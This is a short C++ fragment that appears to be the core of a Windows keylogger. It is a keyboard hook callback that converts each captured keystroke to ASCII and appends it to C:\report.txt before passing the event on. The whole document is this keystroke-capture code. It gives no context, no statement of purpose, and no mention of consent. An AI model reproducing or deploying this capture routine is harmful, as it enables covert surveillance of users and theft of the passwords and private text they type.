LRESULT CALLBACK KeyboardProc (int nCode, WPARAM wParam, LPARAM lParam)
{
    if (((DWORD)lParam & 0x40000000) && (HC_ACTION == nCode))
    {
        if ((wParam == VK_SPACE) || (wParam == VK_RETURN) || (wParam >= 0x2f) && (wParam <= 0x100))
        {
            g_fp = fopen("C:\\report.txt", "a+");
            if (wParam == VK_RETURN)
            {
                char ch = '\n';
                fwrite(&ch, 1, 1, g_fp);
            }
            else
            {
                BYTE keyState[256] = {0};
                GetKeyboardState(keyState);
                WORD wBuf = 0;
                UINT uScanCode = 0;
                ToAscii(wParam, uScanCode, keyState, &wBuf, 0);
                char ch = char(wBuf);
                fwrite(&ch, 1, 1, g_fp);
            }
            fclose(g_fp);
        }

    }

    return CallNextHookEx(g_hkb, nCode, wParam, lParam);
}